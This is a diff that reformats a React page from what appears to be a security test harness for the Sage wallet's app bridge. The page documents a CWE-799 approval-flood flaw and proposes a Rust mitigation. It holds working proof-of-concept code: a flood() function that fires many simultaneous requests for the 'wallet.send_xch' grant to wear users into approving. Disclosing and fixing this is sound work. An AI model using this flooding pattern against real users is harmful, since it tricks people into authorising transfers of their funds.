@@ -18,193 +18,224 @@ import { useSageClient } from '../hooks/useSageClient';
 const TARGET_CAPABILITY = 'wallet.send_xch' as const;
 
 function sectionStyle(): React.CSSProperties {
-    return {
-        display: 'grid',
-        gap: 8,
-        padding: 14,
-        border: '1px solid rgba(255,255,255,0.1)',
-        borderRadius: 10,
-    };
+  return {
+    display: 'grid',
+    gap: 8,
+    padding: 14,
+    border: '1px solid rgba(255,255,255,0.1)',
+    borderRadius: 10,
+  };
 }
 
 function code(s: string) {
-    return (
-        <code
-            style={{
-                background: 'rgba(255,255,255,0.08)',
-                borderRadius: 4,
-                padding: '1px 5px',
-                fontSize: '0.88em',
-                fontFamily: 'monospace',
-            }}
-        >
-            {s}
-        </code>
-    );
+  return (
+    <code
+      style={{
+        background: 'rgba(255,255,255,0.08)',
+        borderRadius: 4,
+        padding: '1px 5px',
+        fontSize: '0.88em',
+        fontFamily: 'monospace',
+      }}
+    >
+      {s}
+    </code>
+  );
 }
 
 async function flood(sage: ReturnType<typeof useSageClient>, count: number) {
-    addLog(
-        `exploit.flood(${count}): firing ${count} simultaneous requestCapabilityGrant('${TARGET_CAPABILITY}') — no await between calls`,
-        'info',
-    );
+  addLog(
+    `exploit.flood(${count}): firing ${count} simultaneous requestCapabilityGrant('${TARGET_CAPABILITY}') — no await between calls`,
+    'info',
+  );
 
-    const promises = Array.from({ length: count }, (_, i) =>
-        sage.app
-            .requestCapabilityGrant({ capability: TARGET_CAPABILITY })
-            .then((result) => {
-                if (result.granted && !result.alreadyGranted) {
-                    addLog(`exploit.flood(${count}): dialog #${i + 1} approved — ${TARGET_CAPABILITY} GRANTED`, 'ok');
-                } else if (result.alreadyGranted) {
-                    addLog(`exploit.flood(${count}): dialog #${i + 1} already granted`, 'ok');
-                } else {
-                    addLog(`exploit.flood(${count}): dialog #${i + 1} denied`, 'fail');
-                }
-            })
-            .catch((err) => {
-                addLog(`exploit.flood(${count}): dialog #${i + 1} error — ${formatSageError(err)}`, 'fail');
-            }),
-    );
+  const promises = Array.from({ length: count }, (_, i) =>
+    sage.app
+      .requestCapabilityGrant({ capability: TARGET_CAPABILITY })
+      .then((result) => {
+        if (result.granted && !result.alreadyGranted) {
+          addLog(
+            `exploit.flood(${count}): dialog #${i + 1} approved — ${TARGET_CAPABILITY} GRANTED`,
+            'ok',
+          );
+        } else if (result.alreadyGranted) {
+          addLog(
+            `exploit.flood(${count}): dialog #${i + 1} already granted`,
+            'ok',
+          );
+        } else {
+          addLog(`exploit.flood(${count}): dialog #${i + 1} denied`, 'fail');
+        }
+      })
+      .catch((err) => {
+        addLog(
+          `exploit.flood(${count}): dialog #${i + 1} error — ${formatSageError(err)}`,
+          'fail',
+        );
+      }),
+  );
 
-    addLog(`exploit.flood(${count}): ${count} approval requests now in flight`, 'info');
-    await Promise.allSettled(promises);
-    addLog(`exploit.flood(${count}): all dialogs resolved`, 'info');
+  addLog(
+    `exploit.flood(${count}): ${count} approval requests now in flight`,
+    'info',
+  );
+  await Promise.allSettled(promises);
+  addLog(`exploit.flood(${count}): all dialogs resolved`, 'info');
 }
 
 async function singleRequest(sage: ReturnType<typeof useSageClient>) {
-    addLog(`exploit.single: requestCapabilityGrant('${TARGET_CAPABILITY}')`, 'info');
-    try {
-        const result = await sage.app.requestCapabilityGrant({ capability: TARGET_CAPABILITY });
-        addLog(`exploit.single: ${JSON.stringify(result, null, 2)}`, result.granted ? 'ok' : 'fail');
-    } catch (err) {
-        addLog(`exploit.single: FAIL ${formatSageError(err)}`, 'fail');
-    }
+  addLog(
+    `exploit.single: requestCapabilityGrant('${TARGET_CAPABILITY}')`,
+    'info',
+  );
+  try {
+    const result = await sage.app.requestCapabilityGrant({
+      capability: TARGET_CAPABILITY,
+    });
+    addLog(
+      `exploit.single: ${JSON.stringify(result, null, 2)}`,
+      result.granted ? 'ok' : 'fail',
+    );
+  } catch (err) {
+    addLog(`exploit.single: FAIL ${formatSageError(err)}`, 'fail');
+  }
 }
 
 async function checkCapabilities(sage: ReturnType<typeof useSageClient>) {
-    addLog('exploit.checkCapabilities: START', 'info');
-    try {
-        const caps = await sage.app.getCapabilities();
-        const hasSend = caps.includes(TARGET_CAPABILITY);
-        addLog(
-            `exploit.checkCapabilities: ${JSON.stringify(caps, null, 2)}\n  → wallet.send_xch granted: ${hasSend}`,
-            hasSend ? 'ok' : 'info',
-        );
-    } catch (err) {
-        addLog(`exploit.checkCapabilities: FAIL ${formatSageError(err)}`, 'fail');
-    }
+  addLog('exploit.checkCapabilities: START', 'info');
+  try {
+    const caps = await sage.app.getCapabilities();
+    const hasSend = caps.includes(TARGET_CAPABILITY);
+    addLog(
+      `exploit.checkCapabilities: ${JSON.stringify(caps, null, 2)}\n  → wallet.send_xch granted: ${hasSend}`,
+      hasSend ? 'ok' : 'info',
+    );
+  } catch (err) {
+    addLog(`exploit.checkCapabilities: FAIL ${formatSageError(err)}`, 'fail');
+  }
 }
 
 export function ApprovalFloodPage() {
-    const sage = useSageClient();
-    const bridge = hasSageBridge();
+  const sage = useSageClient();
+  const bridge = hasSageBridge();
 
-    return (
-        <PageShell
-            title='Exploit: Approval Dialog Flood'
-            subtitle='CWE-799 — approval fatigue via unbounded serial dialog queue'
+  return (
+    <PageShell
+      title='Exploit: Approval Dialog Flood'
+      subtitle='CWE-799 — approval fatigue via unbounded serial dialog queue'
+    >
+      <div style={{ display: 'grid', gap: 16 }}>
+        {/* Vulnerability description */}
+        <div style={sectionStyle()}>
+          <strong style={{ color: '#f87171' }}>Vulnerability</strong>
+          <p style={{ margin: 0, lineHeight: 1.6 }}>
+            {code('app.request_capability_grant')} triggers a user-facing
+            approval dialog. Each call is stored as a new UUID entry in an
+            unbounded {code('BTreeMap<String, PendingBridgeApproval>')} inside
+            the Rust host ({code('bridge/mod.rs:427–442')}) and immediately
+            emits {code('apps:bridge-approval-requested')} — returning{' '}
+            {code('Pending{}')} with{' '}
+            <strong>no rate limiting, deduplication, or per-app cap</strong>.
+          </p>
+          <p style={{ margin: 0, lineHeight: 1.6 }}>
+            Approval dialogs are presented <strong>serially</strong>: the user
+            must dismiss each one before the next appears, with no indication of
+            how many remain in the queue. A malicious plugin fires N requests in
+            a single burst (O(1) cost to the attacker), forcing the user to
+            dismiss each individually (O(N) cost). This is an{' '}
+            <strong>approval fatigue</strong> attack — the same class as MFA
+            prompt bombing — where the attacker only needs the user to slip once
+            across N attempts. Granting any single dialog permanently grants{' '}
+            {code('wallet.send_xch')}, after which all remaining queued dialogs
+            resolve as {code('alreadyGranted')}.
+          </p>
+          <p
+            style={{
+              margin: '8px 0 0',
+              lineHeight: 1.6,
+              fontSize: '0.9em',
+              color: 'rgba(255,255,255,0.55)',
+            }}
+          >
+            Classification:{' '}
+            <a
+              href='https://cwe.mitre.org/data/definitions/799.html'
+              target='_blank'
+              rel='noreferrer'
+              style={{ color: '#93c5fd' }}
+            >
+              CWE-799: Improper Control of Interaction Frequency
+            </a>
+          </p>
+        </div>
+
+        {/* Exploit buttons */}
+        <div style={sectionStyle()}>
+          <strong style={{ color: '#f87171' }}>Run Exploit</strong>
+          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+            <button
+              disabled={!bridge}
+              onClick={() => void singleRequest(sage)}
+              style={{ borderColor: '#f87171', color: '#fecaca' }}
+            >
+              single request (baseline)
+            </button>
+            <button
+              disabled={!bridge}
+              onClick={() => void flood(sage, 5)}
+              style={{ borderColor: '#f87171', color: '#fecaca' }}
+            >
+              flood(5)
+            </button>
+            <button
+              disabled={!bridge}
+              onClick={() => void flood(sage, 20)}
+              style={{
+                background: '#7f1d1d',
+                borderColor: '#f87171',
+                color: '#fecaca',
+                fontWeight: 600,
+              }}
+            >
+              flood(20)
+            </button>
+            <button
+              disabled={!bridge}
+              onClick={() => void checkCapabilities(sage)}
+            >
+              check capabilities
+            </button>
+          </div>
+          {!bridge && (
+            <div style={{ color: '#f87171', fontSize: '0.9em' }}>
+              Sage bridge not available — load this page inside the Sage host.
+            </div>
+          )}
+        </div>
+
+        {/* Mitigation */}
+        <div
+          style={{ ...sectionStyle(), borderColor: 'rgba(74,222,128,0.25)' }}
         >
-            <div style={{ display: 'grid', gap: 16 }}>
-
-                {/* Vulnerability description */}
-                <div style={sectionStyle()}>
-                    <strong style={{ color: '#f87171' }}>Vulnerability</strong>
-                    <p style={{ margin: 0, lineHeight: 1.6 }}>
-                        {code('app.request_capability_grant')} triggers a user-facing approval
-                        dialog. Each call is stored as a new UUID entry in an unbounded{' '}
-                        {code('BTreeMap<String, PendingBridgeApproval>')} inside the Rust host
-                        ({code('bridge/mod.rs:427–442')}) and immediately emits{' '}
-                        {code('apps:bridge-approval-requested')} — returning {code('Pending{}')} with{' '}
-                        <strong>no rate limiting, deduplication, or per-app cap</strong>.
-                    </p>
-                    <p style={{ margin: 0, lineHeight: 1.6 }}>
-                        Approval dialogs are presented <strong>serially</strong>: the user must
-                        dismiss each one before the next appears, with no indication of how many
-                        remain in the queue. A malicious plugin fires N requests in a single burst
-                        (O(1) cost to the attacker), forcing the user to dismiss each individually
-                        (O(N) cost). This is an <strong>approval fatigue</strong> attack —
-                        the same class as MFA prompt bombing — where the attacker only needs the
-                        user to slip once across N attempts. Granting any single dialog permanently
-                        grants {code('wallet.send_xch')}, after which all remaining queued
-                        dialogs resolve as {code('alreadyGranted')}.
-                    </p>
-                    <p style={{ margin: '8px 0 0', lineHeight: 1.6, fontSize: '0.9em', color: 'rgba(255,255,255,0.55)' }}>
-                        Classification:{' '}
-                        <a
-                            href='https://cwe.mitre.org/data/definitions/799.html'
-                            target='_blank'
-                            rel='noreferrer'
-                            style={{ color: '#93c5fd' }}
-                        >
-                            CWE-799: Improper Control of Interaction Frequency
-                        </a>
-                    </p>
-                </div>
-
-                {/* Exploit buttons */}
-                <div style={sectionStyle()}>
-                    <strong style={{ color: '#f87171' }}>Run Exploit</strong>
-                    <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
-                        <button
-                            disabled={!bridge}
-                            onClick={() => void singleRequest(sage)}
-                            style={{ borderColor: '#f87171', color: '#fecaca' }}
-                        >
-                            single request (baseline)
-                        </button>
-                        <button
-                            disabled={!bridge}
-                            onClick={() => void flood(sage, 5)}
-                            style={{ borderColor: '#f87171', color: '#fecaca' }}
-                        >
-                            flood(5)
-                        </button>
-                        <button
-                            disabled={!bridge}
-                            onClick={() => void flood(sage, 20)}
-                            style={{
-                                background: '#7f1d1d',
-                                borderColor: '#f87171',
-                                color: '#fecaca',
-                                fontWeight: 600,
-                            }}
-                        >
-                            flood(20)
-                        </button>
-                        <button
-                            disabled={!bridge}
-                            onClick={() => void checkCapabilities(sage)}
-                        >
-                            check capabilities
-                        </button>
-                    </div>
-                    {!bridge && (
-                        <div style={{ color: '#f87171', fontSize: '0.9em' }}>
-                            Sage bridge not available — load this page inside the Sage host.
-                        </div>
-                    )}
-                </div>
-
-                {/* Mitigation */}
-                <div style={{ ...sectionStyle(), borderColor: 'rgba(74,222,128,0.25)' }}>
-                    <strong style={{ color: '#4ade80' }}>Proposed Mitigation</strong>
-                    <p style={{ margin: 0, lineHeight: 1.6 }}>
-                        In {code('apps_invoke_bridge_internal')} ({code('bridge/mod.rs')}),
-                        before inserting into {code('pending_approvals')}, reject duplicates:
-                    </p>
-                    <pre
-                        style={{
-                            margin: 0,
-                            padding: 12,
-                            background: 'rgba(0,0,0,0.35)',
-                            borderRadius: 8,
-                            fontSize: '0.82em',
-                            whiteSpace: 'pre-wrap',
-                            wordBreak: 'break-all',
-                            color: '#d1fae5',
-                        }}
-                    >
-{`let already_pending = pending
+          <strong style={{ color: '#4ade80' }}>Proposed Mitigation</strong>
+          <p style={{ margin: 0, lineHeight: 1.6 }}>
+            In {code('apps_invoke_bridge_internal')} ({code('bridge/mod.rs')}),
+            before inserting into {code('pending_approvals')}, reject
+            duplicates:
+          </p>
+          <pre
+            style={{
+              margin: 0,
+              padding: 12,
+              background: 'rgba(0,0,0,0.35)',
+              borderRadius: 8,
+              fontSize: '0.82em',
+              whiteSpace: 'pre-wrap',
+              wordBreak: 'break-all',
+              color: '#d1fae5',
+            }}
+          >
+            {`let already_pending = pending
     .values()
     .any(|p| p.app.id() == app_model.id()
           && p.request.method == request.method
@@ -219,13 +250,13 @@ if already_pending {
         ),
     });
 }`}
-                    </pre>
-                    <p style={{ margin: 0, lineHeight: 1.6 }}>
-                        Also: enforce a per-app cap (e.g. 3) on total simultaneous pending
-                        approvals, and surface a visible queue count in the host UI.
-                    </p>
-                </div>
-            </div>
-        </PageShell>
-    );
+          </pre>
+          <p style={{ margin: 0, lineHeight: 1.6 }}>
+            Also: enforce a per-app cap (e.g. 3) on total simultaneous pending
+            approvals, and surface a visible queue count in the host UI.
+          </p>
+        </div>
+      </div>
+    </PageShell>
+  );
 }
